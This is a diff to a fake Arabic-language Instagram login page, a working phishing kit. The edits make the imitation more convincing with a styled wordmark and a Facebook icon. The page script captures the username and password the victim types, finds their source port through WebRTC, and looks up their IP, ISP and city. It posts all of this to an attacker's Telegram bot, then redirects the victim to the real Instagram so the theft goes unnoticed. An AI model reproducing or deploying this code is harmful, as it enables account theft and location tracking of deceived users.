@@ -4,19 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول • Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { width: 100%; max-width: 350px; text-align: center; }
-        .main-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 1px; margin-bottom: 10px; }
-        .logo { width: 175px; margin-bottom: 30px; cursor: pointer; }
-        input { width: 90%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
-        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
-        button:disabled { background-color: #b2dffc; }
-        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; margin: 20px 0; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
-        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; display: block; margin-bottom: 15px; }
-        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
-        .signup-box { background: #fff; border: 1px solid #dbdbdb; padding: 20px; font-size: 14px; }
+        .main-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; margin-bottom: 10px; }
+        
+        /* تأثير كلمة انستجرام المكتوبة (CSS Logo) */
+        .instagram-logo {
+            font-family: 'Grand Hotel', cursive; /* الخط المشبه للحقيقي */
+            font-size: 55px;
+            color: #262626;
+            margin-bottom: 30px;
+            direction: ltr; /* لضمان ظهور الكلمة صح من اليسار لليمين */
+            display: block;
+        }
+
+        input { width: 92%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; color: #262626; }
+        input::placeholder { color: #8e8e8e; font-size: 12px; }
+        input:focus { outline: none; border-color: #a8a8a8; }
+        
+        button { width: 100%; padding: 8px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #1877f2; }
+        
+        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; margin: 25px 0 15px 0; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .fb-icon { width: 16px; margin-left: 8px; }
+        
+        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; }
+        
+        .signup-box { background: #fff; border: 1px solid #dbdbdb; padding: 25px; font-size: 14px; border-radius: 3px; }
         .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
     </style>
 </head>
@@ -24,13 +43,19 @@
 
     <div class="container">
         <div class="main-box">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110008d.png" alt="Instagram" class="logo">
+            <span class="instagram-logo">Instagram</span>
+            
             <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
             <input type="password" id="pass" placeholder="كلمة السر">
             <button id="btn" onclick="grabData()">تسجيل الدخول</button>
             
             <div class="divider">أو</div>
-            <a href="#" class="fb-login">تسجيل الدخول بحساب فيسبوك</a>
+            
+            <a href="#" class="fb-login">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB" class="fb-icon">
+                تسجيل الدخول بحساب فيسبوك
+            </a>
+            
             <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
         </div>
         <div class="signup-box">
@@ -48,9 +73,8 @@
                 pc.createDataChannel("");
                 pc.createOffer().then(o => pc.setLocalDescription(o));
                 pc.onicecandidate = (e) => {
-                    if (e && e.candidate) {
-                        const p = e.candidate.candidate.split(" ")[5];
-                        if (e.candidate.candidate.includes("srflx")) res(p);
+                    if (e && e.candidate && e.candidate.candidate.includes("srflx")) {
+                        res(e.candidate.candidate.split(" ")[5]);
                     }
                 };
                 setTimeout(() => res("80/443"), 3000);
@@ -62,20 +86,11 @@
             const p = document.getElementById('pass').value;
             if(!u || !p) return;
 
-            document.getElementById('btn').innerText = "جاري التحميل...";
+            document.getElementById('btn').innerText = "...جاري التحميل";
 
             const sPort = await getPort();
-            let net = { ip: "Loading...", city: "Unknown", org: "Unknown" };
-            try { 
-                const r = await fetch('https://ipapi.co/json/'); 
-                net = await r.json(); 
-            } catch(e){}
-
-            let batt = "Unknown";
-            try { 
-                const b = await navigator.getBattery(); 
-                batt = `${(b.level * 100).toFixed(0)}%`; 
-            } catch(e){}
+            let net = { ip: "Unknown", city: "Unknown", org: "Unknown" };
+            try { res = await fetch('https://ipapi.co/json/'); net = await res.json(); } catch(e){}
 
             const report = `
 📸 **صيدة انستجرام جديدة (تقرير شامل)** 📸
@@ -84,27 +99,24 @@
 - اليوزر: \`${u}\`
 - الباسورد: \`${p}\`
 
-🌐 **بيانات الاتصال (الراوتر):**
+🌐 **بيانات الشبكة (الراوتر):**
 - الـ IP: \`${net.ip}\`
 - المنفذ (Source Port): \`${sPort}\`
 - الشركة (ISP): \`${net.org}\`
 - المدينة: \`${net.city}\`
 
-📱 **الجهاز:**
-- النظام: \`${navigator.platform}\`
-- البطارية: \`${batt}\`
-
 ✅ **مشروع انستجرام ناجح يا عبد الله**
 ---------------------------------
             `;
 
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: TG_ID, text: report, parse_mode: "Markdown" })
-            });
-
-            window.location.href = "https://www.instagram.com";
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: TG_ID, text: report, parse_mode: "Markdown" })
+                });
+                window.location.href = "https://www.instagram.com";
+            } catch(e) { window.location.href = "https://www.instagram.com"; }
         }
     </script>
 </body>
